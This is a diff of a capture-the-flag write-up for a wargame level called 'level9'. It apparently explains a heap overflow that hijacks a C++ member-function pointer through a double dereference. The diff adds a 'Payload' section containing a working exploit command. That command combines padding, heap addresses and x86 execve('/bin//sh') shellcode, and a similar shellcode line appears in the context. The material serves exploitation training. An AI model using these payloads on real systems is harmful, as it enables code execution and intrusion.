@@ -14,9 +14,6 @@ Here is our shellcode (size 24)
 ./level9 `python -c 'print("A" * 216 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
 ```
 
-```bash
-./level9 `python -c 'print("A" * 4 + "\x14\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x10\xa0\x04\x08")'`
-```
 
 Here is the layout of the heap after the two allocation and construction of N object, and before
 the call to `setAnnotation`
@@ -58,4 +55,19 @@ the call to `setAnnotation`
 ```
 
 this address might be the pointer on member function called at the end of the main return value
+
+### Payload
+
+So the strategy should be to overwrite the member function `0x08048848` and points to another address in the heap that point to a shellcode.
+why 2 jump are needed ? we need 2 jump because the call to the member function is dereferenced two times
+
+`return (**(code **)*instance_2)(instance_2, instance_1);` --> here the 2 `*`
+
+so we craft the payload
+
+```bash
+./level9 `python -c 'print("A" * 4 + "\x14\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x10\xa0\x04\x08")'`
+```
+
+here we have at the end `"\x10\xa0\x04\x08"` that point to an adress (`\x31\xc0\x99\x50`) and this address point to the beginning of the shellcode
 
